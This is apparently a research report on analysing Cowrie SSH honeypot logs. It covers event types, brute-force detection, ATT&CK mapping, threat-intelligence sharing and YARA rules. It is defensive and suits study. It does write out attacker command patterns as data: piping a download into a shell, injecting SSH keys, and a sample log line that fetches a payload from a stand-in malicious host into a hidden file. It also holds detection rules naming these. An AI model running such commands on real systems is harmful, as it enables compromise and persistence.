# Cowrie Honeypot Log Analysis - Research Findings

**Research Date:** 2026-02-26  
**Objective:** Document best practices for Cowrie honeypot log analysis, attack pattern extraction methods, threat intelligence integration approaches, and useful tools for building a production pipeline.

---

## 1. Best Practices for Cowrie Honeypot Log Analysis

### 1.1 Log Format Understanding

Cowrie outputs structured JSON logs (`cowrie.json`) with the following key characteristics:

- **Location:** `var/log/cowrie/cowrie.json`
- **Format:** JSON Lines (one JSON object per line)
- **Timestamp:** ISO8601 format in UTC timezone
- **Session ID:** Unique identifier tying related events together
- **Event Types:** Defined by `eventid` field

### 1.2 Core Event Types

| Event ID | Description | Key Fields |
|----------|-------------|------------|
| `cowrie.session.connect` | New connection attempt | `src_ip`, `src_port`, `dst_ip`, `dst_port` |
| `cowrie.login.success` | Successful authentication | `username`, `password` |
| `cowrie.login.failed` | Failed authentication | `username`, `password` |
| `cowrie.command.input` | Command entered by attacker | `input` |
| `cowrie.command.failed` | Failed command execution | `input` |
| `cowrie.session.file_download` | File downloaded via wget/curl | `url`, `outfile`, `shasum` |
| `cowrie.session.file_upload` | File uploaded via SFTP/SCP | `filename`, `outfile`, `shasum` |
| `cowrie.session.closed` | Session ended | `duration` |
| `cowrie.log.closed` | TTY log saved | `ttylog`, `shasum`, `duplicate` |
| `cowrie.client.version` | SSH client version | `version` |
| `cowrie.client.kex` | SSH key exchange | `hassh`, `hasshAlgorithms` |
| `cowrie.direct-tcpip.request` | SSH proxy request | `dst_ip`, `dst_port` |
| `cowrie.virustotal.scanfile` | VT scan result | `sha256`, `positives`, `total` |

### 1.3 Recommended Analysis Pipeline Architecture

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│  Cowrie Honeypot │───▶│  Log Ingestion   │───▶│  JSON Parser    │
└─────────────────┘    └──────────────────┘    └─────────────────┘
                                                        │
        ┌───────────────────────────────────────────────┼───────────┐
        ▼                                               ▼           ▼
┌───────────────┐    ┌───────────────┐    ┌─────────────────┐  ┌────────────┐
│  Attack Pattern│    │   IoC Extract │    │  Session Replay │  │  TTP Map   │
│   Detection    │    │   (IP/Hash/URL)│   │   (playlog)     │  │  (MITRE)   │
└───────────────┘    └───────────────┘    └─────────────────┘  └────────────┘
```

### 1.4 Session Correlation Best Practices

1. **Group by Session ID:** All events with the same `session` field belong together
2. **Track Attack Flow:** `connect` → `login` attempts → `commands` → `file operations` → `closed`
3. **Session Replay:** TTY logs stored in `var/lib/cowrie/tty/` can be replayed with `playlog` utility
4. **Deduplication:** Use `duplicate` field in `cowrie.log.closed` to identify unique attack patterns

---

## 2. Attack Pattern Extraction Methods

### 2.1 SSH Brute Force Detection

#### Pattern Characteristics:
- Multiple `cowrie.login.failed` events from same `src_ip`
- Rapid sequential attempts (check timestamps)
- Common username patterns: `root`, `admin`, `test`, `user`
- Common password patterns: sequential numbers, dictionary words, credential stuffing lists

#### Detection Algorithm:
```python
# Pseudo-code for brute force detection
def detect_brute_force(events, threshold=5, window_minutes=5):
    ip_attempts = defaultdict(list)
    for event in events:
        if event['eventid'] == 'cowrie.login.failed':
            ip_attempts[event['src_ip']].append(event['timestamp'])
    
    alerts = []
    for ip, timestamps in ip_attempts.items():
        if len(timestamps) >= threshold:
            alerts.append({
                'attacker_ip': ip,
                'attempt_count': len(timestamps),
                'time_window': calculate_window(timestamps),
                'usernames': extract_usernames(events, ip),
                'classification': 'brute_force'
            })
    return alerts
```

### 2.2 Command Sequence Analysis

#### Key Indicators:
1. **Reconnaissance Commands:**
   - `uname -a`, `cat /proc/version`, `cat /etc/issue`
   - `whoami`, `id`, `w`, `last`
   - `ifconfig`, `ip addr`, `netstat -an`
   - `ps aux`, `top`

2. **Persistence Attempts:**
   - SSH key injection: `echo [key] >> ~/.ssh/authorized_keys`
   - Cron jobs: `crontab -e`, files in `/etc/cron.*`
   - Systemd services: `/etc/systemd/system/`
   - `.bashrc` modifications

3. **Malware Download Patterns:**
   - `wget http://*.sh | bash`
   - `curl -s http://* | sh`
   - `ftpget`, `tftp` transfers
   - Base64 encoded payloads

4. **Cryptomining Indicators:**
   - `xmrig`, `minerd`, `stratum+tcp`
   - CPU stress tests before mining
   - Docker socket access attempts

### 2.3 Malware Download Analysis

#### File Artifacts Location:
- **Downloaded files:** `var/lib/cowrie/downloads/`
- **SHA256 hashes:** Available in `cowrie.session.file_download` events
- **VirusTotal integration:** Automatic scanning with results in `cowrie.virustotal.scanfile`

#### Analysis Pipeline:
1. Extract URLs from `cowrie.session.file_download` events
2. Hash analysis (SHA256 provided in logs)
3. File type identification with `file` command or `libmagic`
4. VirusTotal lookup for reputation
5. Static analysis with YARA rules
6. Optional: Dynamic analysis in sandbox

### 2.4 SSH HASSH Fingerprinting

HASSH (SSH Client Fingerprinting) helps identify:
- **Botnet families** (unique HASSH per family)
- **Scanning tools** (Masscan, ZGrab, etc.)
- **Attacker infrastructure** (shared libraries)

```json
{
  "eventid": "cowrie.client.kex",
  "hassh": "c1c9a087eb50a458a51bf480f700dd9e",
  "hasshAlgorithms": "curve25519-sha256,...,hmac-sha2-256,..."
}
```

---

## 3. Threat Intelligence Integration Approaches

### 3.1 IoC Extraction Framework

#### Extractable IoCs from Cowrie:

| IoC Type | Source Event | Enrichment Target |
|----------|--------------|-------------------|
| Attacker IP | `cowrie.session.connect` | IP reputation, ASN, GeoIP |
| Username | `cowrie.login.*` | Credential stuffing lists |
| Password | `cowrie.login.*` | Common password lists |
| File Hash | `cowrie.session.file_*` | VirusTotal, Malware Bazaar |
| Malware URL | `cowrie.session.file_download` | URL reputation, domain analysis |
| SSH Key FP | `cowrie.client.fingerprint` | Known malicious keys |
| HASSH | `cowrie.client.kex` | Attacker tool fingerprinting |

#### Automated Enrichment Pipeline:
```
Raw IoC → Validation → Enrichment → Scoring → Storage → Distribution
    │           │            │           │          │
    ▼           ▼            ▼           ▼          ▼
 Parse      Regex        GeoIP/ASN     ML/Rule    MISP/OpenCTI
 Extract    Validate     Reputation    Based      Database
```

### 3.2 MITRE ATT&CK Mapping

#### Relevant ATT&CK Tactics for Cowrie Analysis:

| Tactic | Technique ID | Description | Cowrie Event Mapping |
|--------|--------------|-------------|---------------------|
| Initial Access | T1078 | Valid Accounts | Successful logins with compromised creds |
| Initial Access | T1110 | Brute Force | Multiple failed login attempts |
| Execution | T1059 | Command/Scripting Interpreter | `cowrie.command.input` events |
| Execution | T1053 | Scheduled Task/Job | Cron manipulation commands |
| Persistence | T1098 | Account Manipulation | SSH key injection |
| Persistence | T1543 | Create/Modify System Process | Systemd service creation |
| Discovery | T1083 | File and Directory Discovery | `ls`, `find`, `cat` commands |
| Discovery | T1087 | Account Discovery | `whoami`, `id`, `cat /etc/passwd` |
| Discovery | T1016 | System Network Configuration | `ifconfig`, `ip` commands |
| Collection | T1005 | Data from Local System | File exfiltration attempts |
| Command & Control | T1071 | Application Layer Protocol | C2 communication patterns |
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Data staging and transfer |

#### TTP Extraction Methodology:
1. **Command Parsing:** Parse shell commands into structured syntax tree
2. **Pattern Matching:** Match against known ATT&CK technique signatures
3. **Behavior Clustering:** Group similar command sequences
4. **Attribution:** Correlate with known threat actor TTPs

### 3.3 MISP Integration

#### Recommended MISP Event Structure:

```json
{
  "info": "Cowrie SSH Brute Force Campaign",
  "tags": ["cowrie", "ssh", "brute-force", "honeypot"],
  "threat_level_id": 2,
  "analysis": 2,
  "Attribute": [
    {
      "type": "ip-src",
      "value": "192.0.2.100",
      "comment": "Attacker IP",
      "tags": ["cowrie:attacker"]
    },
    {
      "type": "sha256",
      "value": "aabbccdd...",
      "comment": "Downloaded malware sample"
    },
    {
      "type": "url",
      "value": "http://malicious.example.com/payload.sh",
      "comment": "Malware download URL"
    }
  ],
  "Galaxy": [
    {
      "name": "MITRE ATT&CK",
      "cluster": "Brute Force"
    }
  ]
}
```

#### MISP Taxonomies for Cowrie:
- `honeypot-basic`: Classification of honeypot types
- `rsit`: Reference Security Incident Classification
- `kill-chain`: Cyber Kill Chain phases
- `estimative-language`: Intelligence confidence
- `tlp`: Traffic Light Protocol for sharing

### 3.4 OpenCTI Integration

OpenCTI can ingest Cowrie data as:
- **Observables:** IPs, hashes, URLs, domain names
- **Indicators:** IoCs with detection patterns
- **Observed Data:** Raw telemetry from honeypot
- **Attack Patterns:** MITRE ATT&CK technique links

---

## 4. Useful Tools and Libraries

### 4.1 Built-in Cowrie Utilities

| Tool | Location | Purpose |
|------|----------|---------|
| `playlog` | `bin/playlog` | Replay TTY session recordings |
| `fsctl` | `bin/fsctl` | Manage fake filesystem |
| `asciinema` | `bin/asciinema` | Convert logs to Asciinema format |
| `createfs` | `bin/createfs` | Create custom fake filesystem |

### 4.2 Python Libraries for Analysis

#### Core Libraries:
```python
# Essential for log parsing
import json
import pandas as pd
from datetime import datetime
from collections import defaultdict

# Network analysis
import geoip2.database
import ipaddress
import socket

# Async processing for large logs
import asyncio
import aiocsv
```

#### Analysis Libraries:
```python
# Command parsing
import shlex
import re

# Pattern matching
import yara-python

# Data analysis
import numpy as np
from scipy import stats

# Machine learning
from sklearn.cluster import DBSCAN
from sklearn.feature_extraction.text import TfidfVectorizer
```

### 4.3 SIEM Integrations

Cowrie supports multiple output modules:

| Output Module | Configuration | Use Case |
|---------------|---------------|----------|
| `jsonlog` | Default | Structured log parsing |
| `textlog` | Plain/CEF format | Generic SIEM ingestion |
| `elasticsearch` | Direct indexing | ELK Stack |
| `splunk` | HTTP Event Collector | Splunk Enterprise |
| `influxdb` | Time-series metrics | Grafana dashboards |
| `mysql` | Relational storage | Custom analytics |
| `mongodb` | Document storage | Flexible queries |
| `redis` | Pub/Sub | Real-time streaming |
| `kafka` | Message bus | Large-scale pipelines |

### 4.4 Third-Party Tools

#### Log Analysis:
- **Modern Honey Network (MHN):** Centralized honeypot management and data collection
- **Kippo-Graph:** Visualization for Cowrie/Kippo logs
- **Cowrie Log Analyzer:** CLI tool for statistics

#### Threat Intelligence:
- **VirusTotal:** Automated file scanning (built-in)
- **GreyNoise:** Internet scanner identification
- **AbuseIPDB:** IP reputation checking
- **IPVoid:** Multi-engine IP reputation

#### Visualization:
- **ELK Stack:** Elasticsearch, Logstash, Kibana
- **Grafana:** Time-series visualization with InfluxDB
- **Jupyter Notebooks:** Interactive analysis

### 4.5 YARA Rules for File Analysis

Example YARA rules for common Cowrie-downloaded malware:

```yara
rule Mirai_Botnet_Dropper {
    strings:
        $s1 = "wget http" nocase
        $s2 = "/bin/busybox" nocase
        $s3 = "MIRAI" nocase
        $s4 = "SATORI" nocase
        $s5 = "telnet" nocase
    condition:
        3 of them
}

rule Cryptominer_Detection {
    strings:
        $s1 = "stratum+tcp://" nocase
        $s2 = "xmrig" nocase
        $s3 = "minerd" nocase
        $s4 = "cpuminer" nocase
        $s5 = "--donate-level" nocase
    condition:
        2 of them
}
```

---

## 5. Pipeline Implementation Recommendations

### 5.1 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        INGESTION LAYER                           │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐                │
│  │ File Beat  │  │  Syslog    │  │  API Pull  │                │
│  └────────────┘  └────────────┘  └────────────┘                │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     PROCESSING LAYER                             │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐                │
│  │ JSON Parser│──▶│Enrichment  │──▶│TTP Mapping │                │
│  └────────────┘  └────────────┘  └────────────┘                │
│       │                                               │         │
│       ▼                                               ▼         │
│  ┌────────────┐                                  ┌────────────┐│
│  │ Pattern    │                                  │ MITRE      ││
│  │ Detection  │                                  │ ATT&CK     ││
│  └────────────┘                                  └────────────┘│
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     STORAGE LAYER                                │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐                │
│  │ Time-Series│  │ Document   │  │ Graph      │                │
│  │ (InfluxDB) │  │ (MongoDB)  │  │ (Neo4j)    │                │
│  └────────────┘  └────────────┘  └────────────┘                │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                   DISTRIBUTION LAYER                             │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐                │
│  │    MISP    │  │  OpenCTI   │  │  TheHive   │                │
│  └────────────┘  └────────────┘  └────────────┘                │
└─────────────────────────────────────────────────────────────────┘
```

### 5.2 Recommended Tech Stack

| Component | Recommendation | Rationale |
|-----------|----------------|-----------|
| Log Shipper | Filebeat/Fluentd | Reliable, low footprint |
| Message Queue | Redis/Kafka | Decoupling, buffering |
| Stream Processing | Apache Flink | Real-time complex event processing |
| Primary Storage | PostgreSQL + TimescaleDB | Relational + time-series |
| Cache | Redis | Session state, IoC lookups |
| Threat Intel | MISP + OpenCTI | Industry standard platforms |
| Visualization | Grafana + Kibana | Flexible dashboards |

### 5.3 Key Implementation Priorities

1. **Session Correlation:** Implement session-based event grouping
2. **Real-time Detection:** Stream processing for immediate alerts
3. **IoC Extraction:** Automated extraction and enrichment
4. **TTP Mapping:** MITRE ATT&CK integration
5. **File Analysis:** Automated malware analysis pipeline
6. **Threat Sharing:** MISP/OpenCTI integration

---

## 6. References

### Official Documentation:
- Cowrie GitHub: https://github.com/cowrie/cowrie
- Cowrie Docs: https://docs.cowrie.org/
- MISP Project: https://www.misp-project.org/
- MITRE ATT&CK: https://attack.mitre.org/

### Related Projects:
- Modern Honey Network (MHN): https://github.com/pwnlandia/mhn
- OpenCTI: https://www.opencti.io/
- T-Pot Multi-Honeypot: https://github.com/telekom-security/tpotce

### Research Papers:
- HASSH: https://engineering.salesforce.com/open-sourcing-hassh-abed10ae4a3f
- SSH Fingerprinting techniques
- Honeypot-based threat intelligence

---

## 7. Appendix: Sample Cowrie JSON Log Entries

### Connection Event:
```json
{
  "eventid": "cowrie.session.connect",
  "timestamp": "2024-01-15T10:30:45.123456Z",
  "src_ip": "192.0.2.100",
  "src_port": 54321,
  "dst_ip": "203.0.113.10",
  "dst_port": 2222,
  "session": "a1b2c3d4e5f6",
  "sensor": "honeypot-01"
}
```

### Failed Login:
```json
{
  "eventid": "cowrie.login.failed",
  "timestamp": "2024-01-15T10:30:50.234567Z",
  "src_ip": "192.0.2.100",
  "session": "a1b2c3d4e5f6",
  "username": "root",
  "password": "admin123"
}
```

### Command Execution:
```json
{
  "eventid": "cowrie.command.input",
  "timestamp": "2024-01-15T10:31:15.345678Z",
  "src_ip": "192.0.2.100",
  "session": "a1b2c3d4e5f6",
  "input": "wget http://malicious.example.com/payload.sh -O /tmp/.hidden.sh"
}
```

### File Download:
```json
{
  "eventid": "cowrie.session.file_download",
  "timestamp": "2024-01-15T10:31:20.456789Z",
  "src_ip": "192.0.2.100",
  "session": "a1b2c3d4e5f6",
  "url": "http://malicious.example.com/payload.sh",
  "outfile": "var/lib/cowrie/downloads/aabbccdd...",
  "shasum": "aabbccdd00112233..."
}
```

---

*End of Research Findings*
